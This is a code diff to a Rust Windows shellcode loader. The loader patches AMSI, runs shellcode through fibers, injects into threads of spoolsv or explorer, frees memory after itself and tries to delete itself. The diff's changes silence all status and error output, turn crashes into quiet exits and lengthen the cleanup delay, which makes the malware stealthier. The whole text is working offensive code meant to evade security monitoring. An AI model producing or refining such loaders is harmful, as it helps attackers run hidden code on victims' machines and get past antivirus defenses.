@@ -68,10 +68,14 @@ fn main() -> Result<()> {
         if _is_admin {
             match get_privs::enable_debug_privilege() {
                 Ok(_) => {},
-                Err(_) => println!("Failed: 210"),
+                Err(_) => {
+                    // println!("Failed: 210");
+                    return Ok(());
+                },
             }
         } else {
-            println!("Failed: 211");
+            // println!("Failed: 211");
+            return Ok(());
         }
 
         // patch AMSI
@@ -99,7 +103,8 @@ fn main() -> Result<()> {
             }
         }
         if patch_addr.is_null() {
-            panic!("Failed: 319");
+            // panic!("Failed: 319");
+            return Ok(());
         }
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
         // make page writable
@@ -159,14 +164,15 @@ fn main() -> Result<()> {
             "/l" => {
                 // LOCAL FIBER
                 if _is_admin {
-                    println!("[+] Initialized");
+                    // println!("[+] Initialized");
                 }
-                println!("[+] Loading ... (this may take a while)");
+                // println!("[+] Loading ... (this may take a while)");
 
                 // convert current thread to fiber
                 let main_fiber = ConvertThreadToFiber(None);
                 if main_fiber.is_null() {
-                    panic!("Failed: 862");
+                    // panic!("Failed: 862");
+                    return Ok(());
                 }
 
                 // allocate memory as RW
@@ -178,7 +184,8 @@ fn main() -> Result<()> {
                     PAGE_READWRITE
                 );
                 if shellcode_mem.is_null() {
-                    panic!("Failed: 472");
+                    // panic!("Failed: 472");
+                    return Ok(());
                 }
 
                 // write shellcode to memory
@@ -198,7 +205,8 @@ fn main() -> Result<()> {
                 let shellcode_func: FiberStartRoutine = std::mem::transmute(shellcode_mem);
                 let shellcode_fiber = CreateFiber(0, Some(shellcode_func), None);
                 if shellcode_fiber.is_null() {
-                    panic!("Failed: 543");
+                    // panic!("Failed: 543");
+                    return Ok(());
                 }
 
                 // transfer execution to shellcode
@@ -227,9 +235,9 @@ fn main() -> Result<()> {
 
                                 match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                                      Ok((addr, _size)) => {
-                                         println!("[+] Success!");
+                                         // println!("[+] Success!");
                                          if use_cleanup {
-                                             thread::sleep(Duration::from_millis(500));
+                                             thread::sleep(Duration::from_millis(10000));
                                              let mut region_size: usize = 0;
                                              let mut base_addr = addr;
                                              missed_calls::nt_free_virtual_memory(
@@ -244,17 +252,17 @@ fn main() -> Result<()> {
                                          spoofing_successful = true;
                                      },
                                      Err(_e) => {
-                                         println!("Failed: 1001");
+                                         // println!("Failed: 1001");
                                          let _ = windows::Win32::System::Threading::TerminateProcess(h_process, 0);
                                      }
                                 }
                             },
                             Err(_e) => {
-                                println!("Failed: 1002");
+                                // println!("Failed: 1002");
                             }
                         }
                     } else {
-                        println!("[-] Spoolsv not found!");
+                        // println!("[-] Spoolsv not found!");
                     }
                 }
                 
@@ -268,19 +276,23 @@ fn main() -> Result<()> {
 
                 // if spoof did not work, fallback
                 if _is_admin {
-                     println!("[+] Initialized!");
+                     // println!("[+] Initialized!");
                 }
-
+                
                 // find target process (explorer)
                 let target_pid = match find_remote::find_target_pid("explorer") {
                     Some(pid) => pid,
-                    None => panic!("Failed: 901"),
+                    None => {
+                        // panic!("Failed: 901");
+                        return Ok(());
+                    },
                 };
-
+                
                 // enum all threads in target process
                 let thread_ids = find_remote::find_all_remote_thread_ids(target_pid);
                 if thread_ids.is_empty() {
-                    panic!("Failed: 902");
+                    // panic!("Failed: 902");
+                    return Ok(());
                 }
 
                 // open process handle once
@@ -297,7 +309,7 @@ fn main() -> Result<()> {
                     match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                         Ok((addr, _size)) => {
                             if use_cleanup {
-                                 thread::sleep(Duration::from_millis(500));
+                                 thread::sleep(Duration::from_millis(10000));
                                  let mut region_size: usize = 0;
                                  let mut base_addr = addr;
                                  missed_calls::nt_free_virtual_memory(
@@ -321,7 +333,8 @@ fn main() -> Result<()> {
                 let _ = remote_fiber::close_process_handle(h_process);
 
                 if !injection_success {
-                    panic!("Failed: 903");
+                    // panic!("Failed: 903");
+                    return Ok(());
                 }
 
                 // attempt self-delete
@@ -331,7 +344,8 @@ fn main() -> Result<()> {
             }
 
             _ => {
-                panic!("Failed: 900");
+                // panic!("Failed: 900");
+                return Ok(());
             }
         }
         destroy_hooks();
